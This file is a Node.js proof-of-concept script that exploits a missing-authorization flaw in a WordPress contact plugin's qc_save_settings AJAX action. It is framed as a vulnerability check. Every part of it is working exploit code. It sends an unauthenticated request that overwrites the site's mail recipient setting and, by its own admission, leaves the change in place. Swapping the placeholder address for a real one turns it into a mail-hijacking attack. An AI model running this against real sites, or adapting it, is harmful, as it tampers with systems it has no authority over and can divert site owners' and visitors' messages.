// probe.mjs — exploit-verification probe for Quick Contact <= 1.0.0
// Missing authorization on the nopriv `qc_save_settings` AJAX action (CVE-2026-90001).
//
// Usage: node probe.mjs <base-url>
// Exit 0 = target is vulnerable (unauthenticated settings update accepted)
// Exit 1 = not vulnerable (request rejected) or the check could not be completed
//
// Only sends requests to <base-url>. Reads nothing from disk, writes nothing locally.

const arg = process.argv[2];
if (!arg) {
  console.error('usage: node probe.mjs <base-url>');
  process.exit(1);
}

let base;
try {
  base = new URL(arg);
} catch {
  console.error('invalid base URL');
  process.exit(1);
}
if (base.protocol !== 'http:' && base.protocol !== 'https:') {
  console.error('base URL must be http(s)');
  process.exit(1);
}

const endpoint = new URL('/wp-admin/admin-ajax.php', base.origin);

// Unique sentinel address on the reserved .invalid TLD; never a real mailbox.
const sentinel = `qc-probe-${Date.now().toString(36)}@example.invalid`;

async function main() {
  const body = new URLSearchParams({
    action: 'qc_save_settings',
    recipient: sentinel,
  });

  let res;
  try {
    res = await fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        Accept: 'application/json',
      },
      body,
      redirect: 'manual',
      signal: AbortSignal.timeout(15000),
    });
  } catch (err) {
    console.error(`request failed: ${err.message}`);
    return 1;
  }

  const text = await res.text();
  let json;
  try {
    json = JSON.parse(text);
  } catch {
    json = undefined;
  }

  if (res.status === 200 && json && json.success === true) {
    console.log(`VULNERABLE: unauthenticated qc_save_settings accepted (recipient set to ${sentinel})`);
    console.log('note: prior qc_recipient value is not readable unauthenticated, so it was not restored');
    return 0;
  }

  console.log(`NOT VULNERABLE: status=${res.status} body=${text.slice(0, 200)}`);
  return 1;
}

main().then(
  (code) => process.exit(code),
  (err) => {
    console.error(`probe error: ${err && err.message}`);
    process.exit(1);
  },
);
